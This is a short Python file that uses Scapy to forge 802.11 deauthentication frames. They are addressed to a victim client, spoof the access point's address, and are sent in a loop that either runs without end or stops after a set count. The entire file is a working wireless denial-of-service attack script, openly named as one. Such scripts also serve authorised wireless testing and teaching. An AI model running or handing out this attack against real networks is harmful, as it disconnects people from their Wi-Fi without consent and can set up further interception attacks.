from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import time

def atkDeauth(vicAddr:str, bssAddr:str, loopMax=0):
    conf.verb = 0

    pktDeauth = RadioTap() /\
        Dot11(type=0, subtype=12, addr1=vicAddr, addr2=bssAddr, addr3=bssAddr) /\
        Dot11Deauth(reason=7)

    loopCnt = 0
    while(True):
        sendp(pktDeauth)
        loopCnt += 1
        print('Deauthentication Frame Sent ('+str(loopCnt) +'). (AP='+bssAddr + ' -> CLI='+vicAddr+')')
        if loopMax != 0:
            if loopCnt >= loopMax:
                break
            # loopMax가 지정되면 특정 횟수만 반복
        else:
            time.sleep(0.5)